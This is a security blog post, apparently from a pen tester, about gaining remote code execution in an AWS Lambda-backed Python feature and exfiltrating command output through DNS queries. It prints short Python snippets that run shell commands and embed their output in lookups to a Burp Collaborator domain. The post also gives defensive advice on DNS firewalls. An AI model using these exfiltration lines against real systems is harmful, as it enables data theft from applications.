@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>What&#39;s in a Name? Writing Custom DNS Tunnelling Protocol, Exploiting AWS Lambda Misconfiguration (Part 1) :: Gladstomych</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+This is a war story of an AWS web application test where remote code execution was first obtained on the client&rsquo;s application. Then I needed to write my own DNS tunnelling &lsquo;protocol&rsquo; to get the data out. Following a number of twists and turns I impersonated the application and attempted to laterally move within the AWS tenant.
+Before storytelling though, let&rsquo;s start with a public service announcement:
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/blog/dns-tunnelling-aws-lambda/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="What&#39;s in a Name? Writing Custom DNS Tunnelling Protocol, Exploiting AWS Lambda Misconfiguration (Part 1)">
+<meta property="og:description" content="
+This is a war story of an AWS web application test where remote code execution was first obtained on the client&rsquo;s application. Then I needed to write my own DNS tunnelling &lsquo;protocol&rsquo; to get the data out. Following a number of twists and turns I impersonated the application and attempted to laterally move within the AWS tenant.
+Before storytelling though, let&rsquo;s start with a public service announcement:
+" />
+<meta property="og:url" content="//localhost:1313/blog/dns-tunnelling-aws-lambda/" />
+<meta property="og:site_name" content="Gladstomych" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-06-06 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ~/gladstomych
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+        
+          <li><a href="/talks">Talks</a></li>
+        
+      
+        
+          <li><a href="/tools">Tools</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/blog" >Blog</a></li>
+        
+      
+        
+          <li><a href="/talks" >Talks</a></li>
+        
+      
+        
+          <li><a href="/tools" >Tools</a></li>
+        
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/blog/dns-tunnelling-aws-lambda/">What&rsquo;s in a Name? Writing Custom DNS Tunnelling Protocol, Exploiting AWS Lambda Misconfiguration (Part 1)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-06-06</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/burpsuite/">burpsuite</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/exploitation/">exploitation</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/network/">network</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/research/">research</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/aws/">aws</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="/blog/dns-tunnelling-aws-lambda/half-life-hecu.gif" alt="half life hecu"></p>
+<p>This is a war story of an AWS web application test where remote code execution was first obtained on the client&rsquo;s application. Then I needed to write my own DNS tunnelling &lsquo;protocol&rsquo; to get the data out. Following a number of twists and turns I impersonated the application and attempted to laterally move within the AWS tenant.</p>
+<p>Before storytelling though, let&rsquo;s start with a public service announcement:</p>
+<h2 id="the-public-service-announcement">The Public Service Announcement<a href="#the-public-service-announcement" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>As the title suggests, I discovered that it was possible to exfiltrate data from an AWS app through external DNS interaction. Interestingly, the disclosure surprised the client quite a bit because they thought it should not possible because, quote &ldquo;all outbound TCP &amp; UDP ports were blocked&rdquo;. On further digging I discovered that this was indeed not enough to stop outbound DNS interactions.</p>
+<p>The <strong>TL;DR</strong> is that, If you have an AWS Lambda app, or an EC2 instance that should not be making outbound connections (an &ldquo;air-gapped cloud machine&rdquo; that only talks to infrastructure owned by you), blocking all TCP &amp; UDP ports through Security Groups &amp; VPC Network Rules is not enough. <em>Even if a <code>0.0.0.0/0</code> DENY rule is in place for port 53, you would need to additionally set up a <strong>Route 53 DNS firewall</strong> to block outbound DNS interactions.</em> Part II of this blog post will include steps to set it up.</p>
+<h2 id="tell-me-about-that-rce-you-got-there">Tell me about that RCE you got there<a href="#tell-me-about-that-rce-you-got-there" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>In the past year or so, our adversary simulation team in JUMPSEC has been focusing heavily on the cloud red teaming scene. As a result, I had been on back to back adsim gigs and being assigned a web application pen test was a nice change of scenery.</p>
+<p>The application in question was built for users of scientific and engineering backgrounds. An AWS Lambda-powered (think serverless function) feature in the app allowed users to submit Python code to perform calculations &amp; simulations. The frontend UI would then display any number-typed results. For example, if a variable exists named &ldquo;foobar&rdquo; after the user supplied Python script ran to completion, and it was a <em>number</em> type at the end (INT, FLOAT, COMPLEX?), the frontend would display (if foobar == 1337):</p>
+<pre tabindex="0"><code>foobar: 1337
+</code></pre><p>However, non-numeric results would be dropped. During the test I found that any Python standard library was available in the environment.</p>
+<h4 id="proving-the-rce-is-alive-and-well">Proving the RCE is alive and well<a href="#proving-the-rce-is-alive-and-well" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Experienced app testers all have their favorite ways to execute OS commands in the major web programming languages, for example <code>exec()</code> in <code>PHP</code>, <code>eval()</code> in <code>Node.js</code>, and in <code>Python</code> my favorite is <code>os.popen()</code>. There are of course a couple others such as <code>subprocess.run()</code> and so on. Look it up if you are interested, on <a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/">PayloadAllTheThings</a> which is my go-to cheatsheet.</p>
+<p>Anyway, having standard Python libs meant we definitely have <code>os</code> , so the easiest proof for &ldquo;working&rdquo; RCE was just this:</p>
+<pre tabindex="0"><code>&gt; import os
+&gt; output = int(os.popen(&#39;echo -n 1337&#39;).read())
+</code></pre><p>And in the UI, voila, we see <code>output: 1337</code>.</p>
+<p>Well this ain&rsquo;t much but it definitely pays the bills. I&rsquo;d be a little hesitant to slap on the scary <em>Critical Risk</em> in the report without proving further impact at this point. Well, let&rsquo;s make some coffee and expand our RCE&rsquo;s capabilities.</p>
+<h4 id="getting-more-data-out">Getting more Data out<a href="#getting-more-data-out" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Some more coffee-powered testing proved that our RCE was working well (I <code>echoed</code> some more numbers such as <code>42</code>, <code>69420</code>, etc). How though, would one make it more useful? Initially I preferred a solution that goes into the UI because it&rsquo;s logical (KISS principle!) and also would look nice on the report. Since the Lambda only returned numbers and would not return any string, we needed a string-to-number encoding function.</p>
+<p>Knowing that Linux shell commands almost always produced ASCII strings, I wrote a little Python function that loops through the command output&rsquo;s ASCII characters which encoded them into their respective ASCII numbers to form a big integer to be shown on the UI. We could then convert the result back to ASCII on our attacking machine. I double checked that all printable ASCIIs are between 0x0 and 0xFF (0-255). The app&rsquo;s UI unfortunately could not output Hex, so we had to settle for transforming 1 ASCII char into a 3 digit number:</p>
+<p>For example, &lsquo;ABC&rsquo; was turned into <code>065066067</code>. This was achieved with passing each character to ord(char) and adding a 0 to any output less than 100, before concatenating them into a single string, and running <code>int()</code> on the whole thing.</p>
+<p>In the UI it would not have the leading <code>0</code>, i.e. you would get <code>65066067068</code> instead, so the decoding function would need to add the <code>0</code> back if <code>len(output) %% 3 != 0</code>, split the string into 3-char chunks and put it through <code>chr</code>, which was the inverse of <code>ord()</code>.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda/pic1.png" alt="pic1"></p>
+<p><img src="/blog/dns-tunnelling-aws-lambda/pic2.png" alt="pic2"></p>
+<blockquote>
+<p>These two are the only &ldquo;real&rdquo; screenshots from the engagement, in case you are curious.</p>
+</blockquote>
+<p>The screenshots showed the encoded output of <code>whoami</code> on the UI, which was decoded with a Python script. While this would also have been &ldquo;good enough&rdquo; (for context, sbx_userXYZ are the runtime users for Lambda), there was a glaring problem from an attacker&rsquo;s perspective.</p>
+<p>In Python&rsquo;s standard libraries, the math (as far as I know) does not get as accurate as thousands of significant figures, and you would need that to get low thousands of bytes out from this encoding method, which isn&rsquo;t a lot. That is probably the reason why the frontend did not give us more than 20 significant figures in the output. (From my limited knowledge, a 4-byte unsigned int in C goes to <code>4294967295</code> maximally, so that&rsquo;s <em>only</em> 10 significant figures, or 3 &ldquo;encoded bytes&rdquo; in our very inefficient scheme).</p>
+<p>I did go into the rabbit hole of trying to dynamically generate named variables (var1, for the first 5 bytes; var2, for 6-10th bytes, and so on), but could not get far.</p>
+<h2 id="oh-we-got-dns">Oh we got DNS!<a href="#oh-we-got-dns" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<blockquote>
+<p>When life closes one door, look hard for native networking capabilities.</p>
+</blockquote>
+<p>Getting Data out from the UI was possible, but impractical. As an attacker in disguise, I felt strongly about my rights to get good user experience! My next step was to look for out-of-band data channels, the most obvious one being HTTP. There were 2 candidates to achieve this that I knew in the back of my head, the OS native <code>curl</code> util, and the <code>urllib.request</code> module in Python. I spun up my own listener on <code>Burp Suite Collaborator</code>, which listened on HTTP &amp; DNS, and did a little request as shown here:</p>
+<pre tabindex="0"><code>&gt; url = f&#39;http://&lt;my-subdomain&gt;.oastify.com&#39;
+&gt; req_status = int(request.urlopen(url).status)
+</code></pre><p><img src="/blog/dns-tunnelling-aws-lambda/pic4.png" alt="pic4"></p>
+<p>To my surprise (and much joy indeed), though Burp Suite showed no HTTP request was received, the DNS query went through to the Name Server of <code>oastify.com</code>, which meant the Lambda was indeed talking back to us through DNS!</p>
+<h4 id="exfil-mechanism-explained">Exfil mechanism explained<a href="#exfil-mechanism-explained" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>For those who are not familiar with the concept of DNS data exfiltration, it works like this – let&rsquo;s say we control DNS records of oastify.com (in reality the PortSwigger company does).
+To run a server with IP a.b.c.d to receive data through that domain, one way is by becoming the Authoritative Nameserver for it. This can be done by creating an NS record for ns1.oastify.com and pointing it to a.b.c.d. If someone runs a DNS query against foobar.oastify.com, the name server a.b.c.d would receive that query. That&rsquo;s the normal working part of DNS. The DNS records described in the paragraph can be written as:</p>
+<pre tabindex="0"><code>&gt; oastify.com    NS  ns1.oaststify.com
+&gt; ns1.oastify.com A    a.b.c.d
+</code></pre><p>If you were an attacker, you would want some juicy data to be sent to your server. How would you make this happen?</p>
+<p>The vulnerable application in question would make the query:
+&ldquo;Hey, internet, can I resolve <code>&lt;juicydata&gt;.oastify.com</code>? &quot;</p>
+<p>And your nameserver at a.b.c.d would get the <code>&lt;juicydata&gt;</code> inside the query, save it in its query log, and then feed the application some junk data:</p>
+<p><em>&ldquo;Oh it&rsquo;s <code>b.c.d.e</code>. Bye now!&rdquo;</em></p>
+<p>To properly PoC this feature, I used a native DNS util in Python called <code>socket.gethostbyname()</code>.</p>
+<pre tabindex="0"><code>&gt; import socket, os
+&gt;
+&gt; url = &#39;i-am-talking-to-you..oastify.com&#39;
+&gt; url2 = f&#39;{os.popen(&#34;/usr/bin/echo -n copy-that&#34;).read()}..oastify.com&#39;
+&gt;
+&gt; lookup1 = socket.gethostbyname(url1)
+&gt; lookup2 = socket.gethostbyname(url2)
+</code></pre><p>Below were queries Burp received when I replicated this part using my own Lambda function. It proved to me that 1. arbitrary subdomain query would also hit our malicous nameserver, and 2. you could put dynamic content (shell command output) in the subdomain and it would also go through AWS&rsquo;s mechanisms to fire off that request.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda/pic5.png" alt="pic5"></p>
+<p><img src="/blog/dns-tunnelling-aws-lambda/pic6.png" alt="pic6"></p>
+<p>This is a good place to stop for now in a 2-part post. In <a href="/blog/whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/">Part 2</a> we cover how this discovery was weaponised into a semi-interactive shell, how the Lambda&rsquo;s identity was assumed by us and how the AWS remediation was found.</p>
+<blockquote>
+<p><strong>Disclaimer</strong>: most demonstrations below were recreated using my own AWS account and client details have been redacted for confidentiality.</p>
+</blockquote>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h"></span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/blog/dns-tunnelling-aws-lambda-part-2/" class="button inline prev">
+        &lt; [<span class="button__text">What&#39;s in a Name? DNS Tunnelling &amp; AWS Lambda Exploitation (Part 2)</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/blog/password-spraying-m365/" class="button inline next">
+         [<span class="button__text">Why Sneak When You Can Walk Through the Front Door – A Love Letter to Password Spraying Against M365</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
